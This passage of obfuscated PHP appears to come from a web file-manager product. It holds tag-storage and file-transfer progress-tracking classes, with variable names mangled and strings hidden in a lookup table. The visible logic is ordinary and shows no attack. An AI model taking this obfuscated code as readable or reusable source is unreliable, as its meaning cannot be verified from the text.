array($ßÏØë¨[420] => 2, $ßÏØë¨[514] => $ãè‘ÌÆ ); $Ê…š½±Ä = array($ßÏØë¨[514] => $”ú—ıü); Model($ßÏØë¨[1956])->where($Ü¨æ •°)->save($Ê…š½±Ä); Model($ßÏØë¨[1957])->where($Ü¨æ •°)->save($Ê…š½±Ä); } $this->_changeChildLevel($ŸêÍº…[$ãè‘ÌÆ ], $ŸêÍº…[$”ú—ıü], !0); $this->where(array($ßÏØë¨[441] => $ãè‘ÌÆ ))->save(array($ßÏØë¨[441] => $”ú—ıü)); $this->_clearChildrenCache($ŸêÍº…[$”ú—ıü]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($£Ä‘ˆÎ) { $¸Ôçë÷ó =& $_SERVER[¹Û¹Æ€]; return array($¸Ôçë÷ó[1958] => array($£Ä‘ˆÎ[0], $¸Ôçë÷ó[1959]), $¸Ôçë÷ó[1960] => array($£Ä‘ˆÎ[0], $¸Ôçë÷ó[1961])); } protected function get($±÷¶—¨ˆ) { $²Ç”Ø÷ =& $_SERVER[¹Û¹Æ€]; $ÍÍ«Ç­¤ = Model($²Ç”Ø÷[531])->metaGet($±÷¶—¨ˆ, $²Ç”Ø÷[1962]); $³Ö’Á¼‡ = json_decode($ÍÍ«Ç­¤, !0); return $³Ö’Á¼‡ ? $³Ö’Á¼‡ : array($²Ç”Ø÷[1963] => $²Ç”Ø÷[98], $²Ç”Ø÷[378] => array()); } protected function set($®¯âü´, $ÁıÏŒÆø) { $Ú˜ÚÚ²ø =& $_SERVER[¹Û¹Æ€]; $ÁıÏŒÆø = $ÁıÏŒÆø ? $ÁıÏŒÆø : array($Ú˜ÚÚ²ø[1963] => $Ú˜ÚÚ²ø[98], $Ú˜ÚÚ²ø[378] => array()); return Model($Ú˜ÚÚ²ø[531])->metaSet($®¯âü´, $Ú˜ÚÚ²ø[1962], json_encode($ÁıÏŒÆø)); } protected function getByTagID($Ñ‡ãÏ«¸, $·•Úˆ¦) { $€ªÑ£€‡ =& $_SERVER[¹Û¹Æ€]; if (!$Ñ‡ãÏ«¸ || !$·•Úˆ¦) { return !1; } if (!Model($€ªÑ£€‡[531])->getInfoSimple($Ñ‡ãÏ«¸)) { return !1; } $Ëñùã”Ô = $this->get($Ñ‡ãÏ«¸); if (!$Ëñùã”Ô || !isset($Ëñùã”Ô[$€ªÑ£€‡[378]])) { return !1; } $ÚŒªˆÍŠ = array_find_by_field($Ëñùã”Ô[$€ªÑ£€‡[378]], $€ªÑ£€‡[408], $·•Úˆ¦); return is_array($ÚŒªˆÍŠ) ? $ÚŒªˆÍŠ : !1; } public function listSource($È¾¡ÜÍ°, $¸‹š¡çØ) { $èûåØ¸÷ =& $_SERVER[¹Û¹Æ€]; if ($¸‹š¡çØ && !is_array($¸‹š¡çØ)) { $¸‹š¡çØ = array($¸‹š¡çØ); } $®¿³×¹ = $this->listData($È¾¡ÜÍ°); $ò³Ú¦² = array(); foreach ($®¿³×¹ as $Â„†Šûú) { $ä½ÀüÏÄ = $Â„†Šûú[$èûåØ¸÷[94]]; if (!$ä½ÀüÏÄ) { continue; } if (!isset($ò³Ú¦²[$ä½ÀüÏÄ])) { $ò³Ú¦²[$ä½ÀüÏÄ] = array(); } $ò³Ú¦²[$ä½ÀüÏÄ][] = $Â„†Šûú[$èûåØ¸÷[435]]; } $ÊÔéŸö = array(); foreach ($ò³Ú¦² as $¢¾Ê°é” => $‡ëÑ¾°–) { $È·ŞæŒ‹ = !0; if (!$¸‹š¡çØ) { $ÊÔéŸö[] = $¢¾Ê°é”; continue; } foreach ($¸‹š¡çØ as $çˆØ©±¡) { if (!in_array($çˆØ©±¡, $‡ëÑ¾°–)) { $È·ŞæŒ‹ = !1; break; } } if ($È·ŞæŒ‹) { $ÊÔéŸö[] = $¢¾Ê°é”; } } if (!$ÊÔéŸö) { return array(); } $ß¬øÒş = array($èûåØ¸÷[426] => array($èûåØ¸÷[427], $ÊÔéŸö), $èûåØ¸÷[514] => $È¾¡ÜÍ°, $èûåØ¸÷[420] => SourceModel::TYPE_GROUP); $³µû…Ó¿ = Model($èûåØ¸÷[1333])->listSource($ß¬øÒş); if (!$³µû…Ó¿ || count($ÊÔéŸö) == $³µû…Ó¿[$èûåØ¸÷[375]][$èûåØ¸÷[376]]) { return $³µû…Ó¿; } $ˆß¦Ïş = array(); $ßÕ¹ì‘´ = array_to_keyvalue($³µû…Ó¿[$èûåØ¸÷[92]], $èûåØ¸÷[22], $èûåØ¸÷[411]); $¾Èä™³Ü = array_to_keyvalue($³µû…Ó¿[$èûåØ¸÷[93]], $èûåØ¸÷[22], $èûåØ¸÷[411]); $”®Ï›· = array_merge($¾Èä™³Ü, $ßÕ¹ì‘´); foreach ($ÊÔéŸö as $ä½ÀüÏÄ) { if (!in_array($ä½ÀüÏÄ, $”®Ï›·)) { $ˆß¦Ïş[] = $ä½ÀüÏÄ; } } if ($ˆß¦Ïş) { $this->removeBySource($È¾¡ÜÍ°, $ˆß¦Ïş); } return $³µû…Ó¿; } protected function listData($ãåé…ø¿) { $¹Ãâ¿Ì™ =& $_SERVER[¹Û¹Æ€]; $Õ‰†áš× = array($¹Ãâ¿Ì™[1650] => 0, $¹Ãâ¿Ì™[493] => array($¹Ãâ¿Ì™[1964], 0), $¹Ãâ¿Ì™[431] => $¹Ãâ¿Ì™[1965] . $ãåé…ø¿); $úùƒä = $¹Ãâ¿Ì™[1966]; $ĞŒ€åÈ  = $this->field($úùƒä)->where($Õ‰†áš×)->order($¹Ãâ¿Ì™[1967])->select(); return $ĞŒ€åÈ  ? $ĞŒ€åÈ  : array(); } protected function addToTag($§àŞµ¯, $Úé¿öÖ”, $Ä·Å½·÷) { $›•à»ëÜ =& $_SERVER[¹Û¹Æ€]; if (!$this->getByTagID($§àŞµ¯, $Ä·Å½·÷) || !$Úé¿öÖ”) { return !1; } if (!Model($›•à»ëÜ[823])->pathInfo($Úé¿öÖ”)) { return !1; } $¶Âã’é = array($›•à»ëÜ[1650] => 0, $›•à»ëÜ[493] => $Ä·Å½·÷, $›•à»ëÜ[430] => $Úé¿öÖ”, $›•à»ëÜ[431] => $›•à»ëÜ[1968] . $§àŞµ¯, $›•à»ëÜ[429] => $›•à»ëÜ[22], $›•à»ëÜ[1853] => 0); if ($this->where($¶Âã’é)->find()) { return !1; } return $this->add($¶Âã’é); } protected function removeFromTag($É ‚Œ»ó, $êŸÕÊáí, $œøÙòõ) { $şï»èÀó =& $_SERVER[¹Û¹Æ€]; if (!$this->getByTagID($É ‚Œ»ó, $œøÙòõ) || !$êŸÕÊáí) { return !1; } if (is_array($êŸÕÊáí)) { $êŸÕÊáí = array($şï»èÀó[17], $êŸÕÊáí); } $¿¸ÍÕ¥ = array($şï»èÀó[1650] => 0, $şï»èÀó[493] => $œøÙòõ, $şï»èÀó[431] => $şï»èÀó[1968] . $É ‚Œ»ó, $şï»èÀó[430] => $êŸÕÊáí); return $this->where($¿¸ÍÕ¥)->delete(); } protected function removeByTag($ÄÉú·´, $µ†æ”Ö) { $ÌêÎ•õ¤ =& $_SERVER[¹Û¹Æ€]; if (!$this->getByTagID($ÄÉú·´, $µ†æ”Ö)) { return !1; } $Â·ëßĞÜ = array($ÌêÎ•õ¤[1650] => 0, $ÌêÎ•õ¤[493] => $µ†æ”Ö, $ÌêÎ•õ¤[431] => $ÌêÎ•õ¤[1968] . $ÄÉú·´); return $this->where($Â·ëßĞÜ)->delete(); } protected function removeBySource($ÏïŞºú±, $“‚—Îé) { $®î—ª±Ğ =& $_SERVER[¹Û¹Æ€]; if (!$ÏïŞºú± || !$“‚—Îé) { return !1; } if (is_array($“‚—Îé)) { $“‚—Îé = array($®î—ª±Ğ[17], $“‚—Îé); } $ĞÓ«®‘ß = array($®î—ª±Ğ[1650] => 0, $®î—ª±Ğ[430] => $“‚—Îé, $®î—ª±Ğ[493] => array($®î—ª±Ğ[1011], 0), $®î—ª±Ğ[431] => $®î—ª±Ğ[1968] . $ÏïŞºú±); return $this->where($ĞÓ«®‘ß)->delete(); } } $_file = $_SERVER[$_SERVER[¹Û¹Æ€][6]]; goto C¹‚¿ì–£; bé¼œ’: class TaskFileTransfer extends Task { protected function startAfter() { $¥×¦Êƒ =& $_SERVER[¹Û¹Æ€]; $¡¨äş¸¿ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¥×¦Êƒ[1689], array($this, $¥×¦Êƒ[1690])); Hook::bind($¥×¦Êƒ[1221], array($this, $¥×¦Êƒ[1691])); Hook::bind($¥×¦Êƒ[1692], array($this, $¥×¦Êƒ[1693])); Hook::bind($¥×¦Êƒ[613], array($this, $¥×¦Êƒ[1694])); Hook::bind($¥×¦Êƒ[614], array($this, $¥×¦Êƒ[1695])); Hook::bind($¥×¦Êƒ[619], array($this, $¥×¦Êƒ[1696])); Hook::bind($¥×¦Êƒ[620], array($this, $¥×¦Êƒ[1697])); Hook::bind($¥×¦Êƒ[616], array($this, $¥×¦Êƒ[1698])); Hook::bind($¥×¦Êƒ[617], array($this, $¥×¦Êƒ[1699])); Hook::bind($¥×¦Êƒ[583], array($this, $¥×¦Êƒ[1700])); Hook::bind($¥×¦Êƒ[580], array($this, $¥×¦Êƒ[1700])); Hook::bind($¥×¦Êƒ[585], array($this, $¥×¦Êƒ[1700])); Hook::bind($¥×¦Êƒ[587], array($this, $¥×¦Êƒ[1700])); Hook::bind($¥×¦Êƒ[589], array($this, $¥×¦Êƒ[1700])); Hook::bind($¥×¦Êƒ[1701], array($this, $¥×¦Êƒ[1702])); Hook::bind($¥×¦Êƒ[606], array($this, $¥×¦Êƒ[1703])); $this->sourceModelCopyFlag = !1; Hook::bind($¥×¦Êƒ[1704], array($this, $¥×¦Êƒ[1705])); Hook::bind($¥×¦Êƒ[1706], array($this, $¥×¦Êƒ[1707])); Hook::bind($¥×¦Êƒ[1708], array($this, $¥×¦Êƒ[1709])); $¡¨äş¸¿[$¥×¦Êƒ[1710]] = LNG($¥×¦Êƒ[1711]); $¡¨äş¸¿[$¥×¦Êƒ[1712]] = 0; $¡¨äş¸¿[$¥×¦Êƒ[1713]] = 0; $¡¨äş¸¿[$¥×¦Êƒ[1061]] = $¥×¦Êƒ[22]; $¡¨äş¸¿[$¥×¦Êƒ[1714]] = $¥×¦Êƒ[22]; $¡¨äş¸¿[$¥×¦Êƒ[1715]] = 0; $¡¨äş¸¿[$¥×¦Êƒ[1716]] = 0; $¡¨äş¸¿[$¥×¦Êƒ[1717]] = 0; if (!$¡¨äş¸¿[$¥×¦Êƒ[1559]]) { $¡¨äş¸¿[$¥×¦Êƒ[1559]] = LNG($¥×¦Êƒ[1718]); } } protected function endAfter() { $×—Š°»° =& $_SERVER[¹Û¹Æ€]; Hook::unbind($×—Š°»°[1689], array($this, $×—Š°»°[1690])); Hook::unbind($×—Š°»°[1221], array($this, $×—Š°»°[1691])); Hook::unbind($×—Š°»°[1692], array($this, $×—Š°»°[1693])); Hook::unbind($×—Š°»°[613], array($this, $×—Š°»°[1694])); Hook::unbind($×—Š°»°[614], array($this, $×—Š°»°[1695])); Hook::unbind($×—Š°»°[619], array($this, $×—Š°»°[1696])); Hook::unbind($×—Š°»°[620], array($this, $×—Š°»°[1697])); Hook::unbind($×—Š°»°[616], array($this, $×—Š°»°[1698])); Hook::unbind($×—Š°»°[617], array($this, $×—Š°»°[1699])); Hook::unbind($×—Š°»°[583], array($this, $×—Š°»°[1700])); Hook::unbind($×—Š°»°[580], array($this, $×—Š°»°[1700])); Hook::unbind($×—Š°»°[585], array($this, $×—Š°»°[1700])); Hook::unbind($×—Š°»°[587], array($this, $×—Š°»°[1700])); Hook::unbind($×—Š°»°[589], array($this, $×—Š°»°[1700])); Hook::unbind($×—Š°»°[1701], array($this, $×—Š°»°[1702])); Hook::unbind($×—Š°»°[606], array($this, $×—Š°»°[1703])); Hook::unbind($×—Š°»°[1704], array($this, $×—Š°»°[1705])); Hook::unbind($×—Š°»°[1706], array($this, $×—Š°»°[1707])); Hook::unbind($×—Š°»°[1708], array($this, $×—Š°»°[1709])); } public function copyMoveStart($ƒ¾üàíò, $ú ÊĞßÊ, $¿×‚æÑÒ, $«ß•Éˆ…) { $²Ô¢ÅÎ© =& $_SERVER[¹Û¹Æ€]; self::log($²Ô¢ÅÎ©[1719] . $ú ÊĞßÊ . $²Ô¢ÅÎ©[80] . $«ß•Éˆ…); $áäâÃõš = rtrim(TEMP_FILES, $²Ô¢ÅÎ©[18]); if (substr($ú ÊĞßÊ, 0, strlen($áäâÃõš)) == $áäâÃõš) { return; } if (substr($«ß•Éˆ…, 0, strlen($áäâÃõš)) == $áäâÃõš) { return; } $ä•Œ«‘ =& $this->task; $ä•Œ«‘[$²Ô¢ÅÎ©[1720]] = KodIO::transferType($ƒ¾üàíò, $¿×‚æÑÒ); $this->update(); } public function updateAfter() { $àß¥ë»Ú =& $_SERVER[¹Û¹Æ€]; $›¹ıı© =& $this->task; if (!$›¹ıı©[$àß¥ë»Ú[761]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($›¹ıı©[$àß¥ë»Ú[1720]] == $àß¥ë»Ú[1310]) { return; } self::updateTask($›¹ıı©); } private static function updateTask(&$¢§›“Åê) { $»ƒû“µ‡ =& $_SERVER[¹Û¹Æ€]; if ($¢§›“Åê[$»ƒû“µ‡[1720]] == $»ƒû“µ‡[1192] || $¢§›“Åê[$»ƒû“µ‡[1720]] == $»ƒû“µ‡[117]) { if ($¢§›“Åê[$»ƒû“µ‡[1714]]) { $¢§›“Åê[$»ƒû“µ‡[1717]] = $¢§›“Åê[$»ƒû“µ‡[1716]] + $¢§›“Åê[$»ƒû“µ‡[1713]]; } } else { if ($¢§›“Åê[$»ƒû“µ‡[1720]] == $»ƒû“µ‡[1311]) { if ($¢§›“Åê[$»ƒû“µ‡[1714]] == $»ƒû“µ‡[1192]) { $¢§›“Åê[$»ƒû“µ‡[1717]] = $¢§›“Åê[$»ƒû“µ‡[1716]] + $¢§›“Åê[$»ƒû“µ‡[1713]] * 0.5; } else { if ($¢§›“Åê[$»ƒû“µ‡[1714]] == $»ƒû“µ‡[117]) { $¢§›“Åê[$»ƒû“µ‡[1717]] = $¢§›“Åê[$»ƒû“µ‡[1716]] + $¢§›“Åê[$»ƒû“µ‡[1712]] * 0.5 + $¢§›“Åê[$»ƒû“µ‡[1713]] * 0.5; } } } } $¢§›“Åê[$»ƒû“µ‡[1661]] = $¢§›“Åê[$»ƒû“µ‡[1717]] / $¢§›“Åê[$»ƒû“µ‡[761]]; if ($¢§›“Åê[$»ƒû“µ‡[1661]] > 0) { $‡ÒøËÌã = timeFloat() - $¢§›“Åê[$»ƒû“µ‡[1663]] - $¢§›“Åê[$»ƒû“µ‡[1666]]; $¢§›“Åê[$»ƒû“µ‡[1667]] = $‡ÒøËÌã * (1 - $¢§›“Åê[$»ƒû“µ‡[1661]]) / $¢§›“Åê[$»ƒû“µ‡[1661]]; } } public function addPath($Ùß“šØ) { $ùøÏ°ï =& $_SERVER[¹Û¹Æ€]; if (!$Ùß“šØ) { return; } $Øş•ó¹æ =& $this->task; $¸çÌÁõì = IO::infoWithChildren($Ùß“šØ); $è³ôéÕÖ = $Øş•ó¹æ[$ùøÏ°ï[1721]] ? $Øş•ó¹æ[$ùøÏ°ï[1721]][$ùøÏ°ï[1722]] : 0; $Øş•ó¹æ[$ùøÏ°ï[1721]] = array($ùøÏ°ï[1722] => $è³ôéÕÖ + 1, $ùøÏ°ï[429] => $¸çÌÁõì[$ùøÏ°ï[42]], $ùøÏ°ï[94] => $¸çÌÁõì[$ùøÏ°ï[94]], $ùøÏ°ï[528] => $¸çÌÁõì[$ùøÏ°ï[528]] ? $¸çÌÁõì[$ùøÏ°ï[528]] : $¸çÌÁõì[$ùøÏ°ï[94]]); if ($¸çÌÁõì[$ùøÏ°ï[43]] == $ùøÏ°ï[209]) { $Øş•ó¹æ[$ùøÏ°ï[784]] += 1; } else { $Øş•ó¹æ[$ùøÏ°ï[784]] += $¸çÌÁõì[$ùøÏ°ï[89]][$ùøÏ°ï[87]]; if ($¸çÌÁõì[$ùøÏ°ï[411]]) { $Øş•ó¹æ[$ùøÏ°ï[784]] += $¸çÌÁõì[$ùøÏ°ï[89]][$ùøÏ°ï[88]] + 1; } } $Øş•ó¹æ[$ùøÏ°ï[761]] += $¸çÌÁõì[$ùøÏ°ï[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÓÄÌ‹­á) { } public function sourceAddHashEnd($‹¸ú«»Œ) { } public function sourceAddFileStart($Ûë×³â¢) { $‹ÉšÍ =& $_SERVER[¹Û¹Æ€]; $ˆÎ‰ÏÜ =& $this->task; $ˆÎ‰ÏÜ[$‹ÉšÍ[1712]] = $Ûë×³â¢[$‹ÉšÍ[86]]; $ˆÎ‰ÏÜ[$‹ÉšÍ[1710]] = $Ûë×³â¢[$‹ÉšÍ[42]]; $ˆÎ‰ÏÜ[$‹ÉšÍ[1061]] = $Ûë×³â¢[$‹ÉšÍ[42]]; $ˆÎ‰ÏÜ[$‹ÉšÍ[1723]] = $Ûë×³â¢[$‹ÉšÍ[94]]; $this->update(); } public function sourceAddFileEnd($ÅÇ‰İĞ›) { $›¬ûÆ¹ =& $_SERVER[¹Û¹Æ€]; $‘Ù´ˆ¾Û =& $this->task; $‘Ù´ˆ¾Û[$›¬ûÆ¹[1717]] += $ÅÇ‰İĞ›[$›¬ûÆ¹[86]]; $‘Ù´ˆ¾Û[$›¬ûÆ¹[1723]] = $ÅÇ‰İĞ›[$›¬ûÆ¹[94]]; $this->update(1); } public function copyFileStart($ÔÌ´§•æ, $¦ŞÌÉ’§, $°¡Ü¾¬ê, $ÀØ´­÷Ò, $Ã‹¸÷ó, $ªá‚­õØ) { $×ä€¾ë¡ =& $_SERVER[¹Û¹Æ€]; $××™£§Î = $Ã‹¸÷ó; if ($××™£§Î == $GLOBALS[$×ä€¾ë¡[1724]]) { $××™£§Î = $GLOBALS[$×ä€¾ë¡[1725]]; } $GLOBALS[$×ä€¾ë¡[1725]] = $Ã‹¸÷ó; $GLOBALS[$×ä€¾ë¡[1724]] = $ªá‚­õØ; $áŠ¼‚…¡ =& $this->task; $áŠ¼‚…¡[$×ä€¾ë¡[1710]] = $××™£§Î; $áŠ¼‚…¡[$×ä€¾ë¡[1712]] = (int) $ÔÌ´§•æ->size($¦ŞÌÉ’§); $áŠ¼‚…¡[$×ä€¾ë¡[1713]] = 0; $áŠ¼‚…¡[$×ä€¾ë¡[1061]] = $×ä€¾ë¡[22]; $áŠ¼‚…¡[$×ä€¾ë¡[1714]] = $×ä€¾ë¡[22]; $áŠ¼‚…¡[$×ä€¾ë¡[1715]] = 0; $‘îµŸ¤ = $áŠ¼‚…¡[$×ä€¾ë¡[1712]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($áŠ¼‚…¡[$×ä€¾ë¡[408]] . $×ä€¾ë¡[1726]); if ($‘îµŸ¤ && file_exists(get_path_father($ÀØ´­÷Ò))) { Cache::set($áŠ¼‚…¡[$×ä€¾ë¡[408]] . $×ä€¾ë¡[1726], $ÀØ´­÷Ò); $áŠ¼‚…¡[$×ä€¾ë¡[1683]] = array($×ä€¾ë¡[1727], $×ä€¾ë¡[1728]); } $this->update(0, $‘îµŸ¤); } public static function updateCopyLocalFileSize($ªÒ½ÔÏñ) { $¯²×–ñç =& $_SERVER[¹Û¹Æ€]; $îÒôÑ‘ß = Cache::get($ªÒ½ÔÏñ[$¯²×–ñç[408]] . $¯²×–ñç[1726]); if (!$îÒôÑ‘ß || !file_exists($îÒôÑ‘ß)) { return $ªÒ½ÔÏñ; } $ªÒ½ÔÏñ[$¯²×–ñç[1713]] = @filesize($îÒôÑ‘ß); $ªÒ½ÔÏñ[$¯²×–ñç[1717]] += $ªÒ½ÔÏñ[$¯²×–ñç[1713]]; self::updateTask($ªÒ½ÔÏñ); return $ªÒ½ÔÏñ; } public function copyFileEnd($´Ÿñªùò, $–Ó“®•å, $ØáÄ‘Ü¹, $‹º·£äĞ, $å’¾è›Ü, $äâìó”—) { $¯†çÍ‘¤ =& $_SERVER[¹Û¹Æ€]; $›ÂÂş˜ä =& $this->task; $›ÂÂş˜ä[$¯†çÍ‘¤[1713]] = $›ÂÂş˜ä[$¯†çÍ‘¤[1712]]; $›ÂÂş˜ä[$¯†çÍ‘¤[1714]] = $¯†çÍ‘¤[22]; unset($›ÂÂş˜ä[$¯†çÍ‘¤[1683]]); if ($å’¾è›Ü == $›ÂÂş˜ä[$¯†çÍ‘¤[1710]]) { $›ÂÂş˜ä[$¯†çÍ‘¤[1716]] += $›ÂÂş˜ä[$¯†çÍ‘¤[1712]]; $›ÂÂş˜ä[$¯†çÍ‘¤[1717]] = $›ÂÂş˜ä[$¯†çÍ‘¤[1716]]; $¯ÙÈ©‘® = 1; if (isset($›ÂÂş˜ä[$¯†çÍ‘¤[1723]]) && $›ÂÂş˜ä[$¯†çÍ‘¤[1723]] == $–Ó“®•å) { $¯ÙÈ©‘® = 0; } $this->update($¯ÙÈ©‘®); } else { $this->update(); $›ÂÂş˜ä[$¯†çÍ‘¤[1713]] = 0; } Cache::remove($›ÂÂş˜ä[$¯†çÍ‘¤[408]] . $¯†çÍ‘¤[1726]); self::log($¯†çÍ‘¤[1729] . $–Ó“®•å . $¯†çÍ‘¤[80] . $‹º·£äĞ . $¯†çÍ‘¤[12] . $å’¾è›Ü . $¯†çÍ‘¤[1730] . $›ÂÂş˜ä[$¯†çÍ‘¤[1710]]); } public function updateFileEnd($òÛ®½Õ£, $÷±ª¡àÂ) { $ÈÍ’»î¯ =& $_SERVER[¹Û¹Æ€]; $İ…èÄÈ© =& $this->task; $İ…èÄÈ©[$ÈÍ’»î¯[1710]] = $òÛ®½Õ£; $İ…èÄÈ©[$ÈÍ’»î¯[1712]] = $÷±ª¡àÂ; $İ…èÄÈ©[$ÈÍ’»î¯[1716]] += $÷±ª¡àÂ; $İ…èÄÈ©[$ÈÍ’»î¯[1717]] = $İ…èÄÈ©[$ÈÍ’»î¯[1716]]; $this->update(1); self::log($ÈÍ’»î¯[1731] . $òÛ®½Õ£); } public function sourceModelCopy($Í˜Ãö¼‰) { $°ö¹‡ú =& $_SERVER[¹Û¹Æ€]; $Èòïçóí = $Í˜Ãö¼‰[0]; $Óà½âó = $Í˜Ãö¼‰[1]; $‹‹½¢± =& $this->task; $this->sourceModelCopyFlag = !0; $‰ÑÍ±ç‹ = 0; switch ($Èòïçóí) { case $°ö¹‡ú[581]: $‰ÑÍ±ç‹ = 1; break; case $°ö¹‡ú[584]: $‹‹½¢±[$°ö¹‡ú[1710]] = $Óà½âó[$°ö¹‡ú[42]]; break; case $°ö¹‡ú[586]: $‰ÑÍ±ç‹ = intval($Í˜Ãö¼‰[$°ö¹‡ú[389]] * 0.4); break; case $°ö¹‡ú[588]: $‰ÑÍ±ç‹ = intval($Í˜Ãö¼‰[$°ö¹‡ú[389]] * 0.2); break; case $°ö¹‡ú[590]: $‰ÑÍ±ç‹ = intval($Í˜Ãö¼‰[$°ö¹‡ú[389]] * 0.4); break; } $this->update($‰ÑÍ±ç‹); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ñÕ»íÈé, $¯‘ˆãö) { $‘ÖÆÒ›ı =& $_SERVER[¹Û¹Æ€]; $this->sourceModelCopyFlag = !0; $Ñ·³Ş… = 1; if (isset($ñÕ»íÈé[$‘ÖÆÒ›ı[89]])) { $Ñ·³Ş… = $ñÕ»íÈé[$‘ÖÆÒ›ı[89]][$‘ÖÆÒ›ı[87]]; $Ñ·³Ş… = $Ñ·³Ş… + $ñÕ»íÈé[$‘ÖÆÒ›ı[89]][$‘ÖÆÒ›ı[88]] + 1; } $this->update($Ñ·³Ş…); $this->sourceModelCopyFlag = !1; } public function sourceMove($é¾°¯ñ¹) { $this->sourceRemove($é¾°¯ñ¹, !1); } public function curlProgress($´ªÄúã´, $Íµùà»—, $Ë¸ªş÷Û, $¹¶ßÆ¹Ì, $úñä†‚) { $ÄµšŸ =& $_SERVER[¹Û¹Æ€]; $ù™¬êŒ¥ =& $this->task; if ($úñä†‚ > 0) { $ù™¬êŒ¥[$ÄµšŸ[1061]] = $ÄµšŸ[1732]; $ù™¬êŒ¥[$ÄµšŸ[1714]] = $ÄµšŸ[117]; if ($ù™¬êŒ¥[$ÄµšŸ[1712]]) { $ù™¬êŒ¥[$ÄµšŸ[1713]] = $úñä†‚; } if ($ù™¬êŒ¥[$ÄµšŸ[1715]]) { $ù™¬êŒ¥[$ÄµšŸ[1713]] = $úñä†‚ + $ù™¬êŒ¥[$ÄµšŸ[1715]]; } } else { if ($Ë¸ªş÷Û > 0) { if ($ù™¬êŒ¥[$ÄµšŸ[1712]] == $Íµùà»—) { $ù™¬êŒ¥[$ÄµšŸ[1713]] = $Ë¸ªş÷Û; $ù™¬êŒ¥[$ÄµšŸ[1061]] = $ÄµšŸ[1733]; $ù™¬êŒ¥[$ÄµšŸ[1714]] = $ÄµšŸ[1192]; } } } $this->update(); } public function curlProgressStart($ÇÉ¢èÈ) { } public function curlProgressEnd($Õè¼ìà©) { $Æ†¶€íØ =& $_SERVER[¹Û¹Æ€]; $”Ü„— =& $this->task; $ÉËşŒ­Ú = curl_getinfo($Õè¼ìà©); $ŒÚ»èöÒ = $ÉËşŒ­Ú[$Æ†¶€íØ[1734]]; if ($ŒÚ»èöÒ == -1) { $ŒÚ»èöÒ = $ÉËşŒ­Ú[$Æ†¶€íØ[1735]]; } if ($”Ü„—[$Æ†¶€íØ[1714]] == $Æ†¶€íØ[117] && $ŒÚ»èöÒ) { $”Ü„—[$Æ†¶€íØ[1715]] += $ŒÚ»èöÒ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $¡¢£Ø¤à =& $_SERVER[¹Û¹Æ€]; $Øš›ö  =& $this->task; $Øš›ö [$¡¢£Ø¤à[1736]] = 1; Hook::bind($¡¢£Ø¤à[1704], array($this, $¡¢£Ø¤à[1737])); Hook::bind($¡¢£Ø¤à[1706], array($this, $¡¢£Ø¤à[1738])); Hook::bind($¡¢£Ø¤à[1708], array($this, $¡¢£Ø¤à[1739])); } protected function endAfter() { $©¥ÎÁ˜ =& $_SERVER[¹Û¹Æ€]; Hook::unbind($©¥ÎÁ˜[1704], array($this, $©¥ÎÁ˜[1737])); Hook::unbind($©¥ÎÁ˜[1706], array($this, $©¥ÎÁ˜[1738])); Hook::unbind($©¥ÎÁ˜[1708], array($this, $©¥ÎÁ˜[1739])); } public function progressStart($ã¤·çÙ) { $×á¢Æ¶ª =& $_SERVER[¹Û¹Æ€]; $û†íÔ¹İ = curl_getinfo($ã¤·çÙ); self::log($×á¢Æ¶ª[1740] . $û†íÔ¹İ[$×á¢Æ¶ª[316]]); self::valueSet($this->task[$×á¢Æ¶ª[408]], $this->task); } public function progressEnd($„½Ûæ­) { $ø ÅĞä =& $_SERVER[¹Û¹Æ€]; self::log($ø ÅĞä[1741] . $this->task[$ø ÅĞä[408]]); $this->end(); } public function progress($ƒæ›òäŒ, $¢¼¢åœÊ, $ÕÑÊşµ, $´³œÁ¦, $¢ğŸİ¸’) { $ÄÑÔËÁ— =& $_SERVER[¹Û¹Æ€]; $¦¯Úµ¹‡ =& $this->task; if ($¢ğŸİ¸’ > 0) { $¦¯Úµ¹‡[$ÄÑÔËÁ—[784]] = $¦¯Úµ¹‡[$ÄÑÔËÁ—[784]] == 0 ? $´³œÁ¦ : $¦¯Úµ¹‡[$ÄÑÔËÁ—[784]]; $¦¯Úµ¹‡[$ÄÑÔËÁ—[1660]] = $¢ğŸİ¸’; } else { if ($ÕÑÊşµ > 0) { $¦¯Úµ¹‡[$ÄÑÔËÁ—[784]] = $¦¯Úµ¹‡[$ÄÑÔËÁ—[784]] == 0 ? $¢¼¢åœÊ : $¦¯Úµ¹‡[$ÄÑÔËÁ—[784]]; $¦¯Úµ¹‡[$ÄÑÔËÁ—[1660]] = $ÕÑÊşµ; } } $this->update(); self::log("\x70\x72\x6f\x67\x72\145\x73\163\110\x74\x74\160\x3a\x64\x6f\167\x6e\72{$ÕÑÊşµ}\57{$¢¼¢åœÊ}\x3b\x20\x75\x70\x6c\157\x61\144\72{$¢ğŸİ¸’}\x2f{$´³œÁ¦}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ÿ‚±©ó°, $ã´í = '', $İ‰Ì¯Ù = 0, $×¾æ²‘ = '') { $Ö‘Ó‘È´ =& $_SERVER[¹Û¹Æ€]; $ç¨ÀŞçÑ = new Task($Ÿ‚±©ó°, $ã´í, $İ‰Ì¯Ù, $×¾æ²‘); $GLOBALS[$Ö‘Ó‘È´[1742] . $Ÿ‚±©ó°] = new TaskLog($Ö‘Ó‘È´[1643], $ç¨ÀŞçÑ, $×¾æ²‘); return $ç¨ÀŞçÑ; } public function __construct($şÙ±îµ = '', $‡ÌÃ®ÕÎ = '', $åÈıÎ… = '') { $µ›ÖÄŞ =& $_SERVER[¹Û¹Æ€]; if (!$şÙ±îµ) { $şÙ±îµ = $µ›ÖÄŞ[1643]; } $ãçƒ» = $şÙ±îµ . $µ›ÖÄŞ[395] . rand_string(10); if (!$åÈıÎ…) { $åÈıÎ… = $şÙ±îµ . $µ›ÖÄŞ[63] . $åÈıÎ…; } switch ($şÙ±îµ) { case $µ›ÖÄŞ[1643]: if (!$‡ÌÃ®ÕÎ || !$‡ÌÃ®ÕÎ->task) { return echoLog($şÙ±îµ . $µ›ÖÄŞ[1743]); } $—Íøñ£ = $‡ÌÃ®ÕÎ; $ãçƒ» = 